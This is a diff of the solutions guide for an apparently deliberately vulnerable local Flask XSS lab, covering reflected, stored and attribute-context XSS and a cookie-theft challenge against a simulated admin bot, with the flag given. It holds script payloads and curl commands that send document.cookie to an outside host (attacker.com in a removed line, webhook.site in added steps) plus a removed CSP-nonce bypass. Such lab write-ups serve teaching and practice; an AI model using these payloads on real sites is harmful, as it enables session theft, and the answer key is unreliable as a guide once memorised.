@@ -3,8 +3,7 @@
 ===============================================================================
 
 CHALLENGE 1: Reflected XSS (Search)
-Flag: (no direct flag — used to demonstrate reflected XSS)
-
+------------------------------------
   The /search endpoint renders the query with Markup() bypassing
   Jinja2 auto-escaping:
 
@@ -17,8 +16,7 @@ Flag: (no direct flag — used to demonstrate reflected XSS)
 -------------------------------------------------------------------------------
 
 CHALLENGE 2: Stored XSS (Comments)
-Flag: (no direct flag — used to steal cookies)
-
+------------------------------------
   The /post/<id>/comment endpoint stores comments without sanitization.
   Comments are rendered with the |safe filter in templates.
 
@@ -31,48 +29,75 @@ Flag: (no direct flag — used to steal cookies)
 -------------------------------------------------------------------------------
 
 CHALLENGE 3: DOM XSS (Profile)
-Flag: (no direct flag — demonstrates attribute injection)
-
+------------------------------------
   The /profile/<id> endpoint renders display_name with |safe in
-  an HTML attribute context. User 3 (Alt) has injectable display_name.
+  an HTML attribute context. User 1 (admin) has display_name "Admin<User>"
+  which demonstrates how unsanitized output can break attribute context.
 
-  Visit: http://localhost:5002/profile/3
-
-  The display_name is rendered unsafely, enabling attribute injection
-  and event handler XSS.
+  Visit: http://localhost:5002/profile/1
 
 -------------------------------------------------------------------------------
 
-CHALLENGE 4: CSP Bypass (Predictable Nonce)
-Flag: (no direct flag — demonstrates CSP bypass)
-
-  The /csp-demo endpoint sets a Content-Security-Policy with a
-  hardcoded nonce: 'nonce-abc123'
-
-  Since the nonce is predictable (always abc123), bypass CSP:
-
-  http://localhost:5002/csp-demo?comment=<script nonce="abc123">alert('CSP Bypassed')</script>
-
-  In real apps, nonces must be cryptographically random per request.
-
--------------------------------------------------------------------------------
-
-CHALLENGE 5: Cookie Theft via Admin Bot
+CHALLENGE 4: Cookie Theft via Admin Bot
 Flag: FLAG{xss_c00kie_st34l}
+------------------------------------
 
-  The /report endpoint simulates an admin bot visiting a URL.
-  Submit a URL containing an XSS payload that steals the admin's cookie.
+  This is the main flag challenge. The workflow is:
 
-  curl -X POST http://localhost:5002/report \
-    -d "url=http://localhost:5002/search?q=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
+  STEP 1 — Plant a Stored XSS payload
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  Post a comment on any forum post containing a script that exfiltrates
+  cookies to your webhook.site URL.
 
-  The bot (simulated server-side) "visits" the URL with admin cookies.
-  The flag is returned in the response when the bot processes the report.
+  Go to https://webhook.site and copy your unique URL (e.g.
+  https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx).
 
-  Direct test:
-  curl -X POST http://localhost:5002/report \
-    -d "url=http://localhost:5002/"
+  Then post a comment:
 
-  The response contains: FLAG{xss_c00kie_st34l}
+    curl -X POST http://localhost:5002/post/1/comment \
+      -d "username=hacker" \
+      -d "content=<script>document.location='https://webhook.site/YOUR-UUID?c='+document.cookie</script>"
+
+  Or via the web UI: go to any post, enter a username, and paste this
+  as the comment:
+
+    <script>document.location='https://webhook.site/YOUR-UUID?c='+document.cookie</script>
+
+  STEP 2 — Report the page URL to the admin bot
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  Go to http://localhost:5002/report and submit the URL of the post
+  that contains your XSS payload:
+
+    http://localhost:5002/post/1
+
+  Or via curl:
+
+    curl -X POST http://localhost:5002/report \
+      -H "Content-Type: application/json" \
+      -d '{"url":"http://localhost:5002/post/1"}'
+
+  STEP 3 — The admin bot visits the page
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  The server-side admin bot fetches the page with the admin cookie:
+
+    Cookie: session=admin_secret_session_token_FLAG{xss_c00kie_st34l}
+
+  It detects the <script> tag (XSS indicator) in the HTML, finds the
+  webhook.site URL in the payload, and simulates the XSS firing by
+  sending the admin cookie to your webhook.site endpoint as a query
+  parameter.
+
+  STEP 4 — Check webhook.site for the flag
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  Go back to https://webhook.site and look at the incoming request.
+  You will see:
+
+    GET /?cookie=session%3Dadmin_secret_session_token_FLAG%7Bxss_c00kie_st34l%7D
+
+  URL-decoded, the cookie value is:
+
+    session=admin_secret_session_token_FLAG{xss_c00kie_st34l}
+
+  The flag is: FLAG{xss_c00kie_st34l}
 
 ===============================================================================
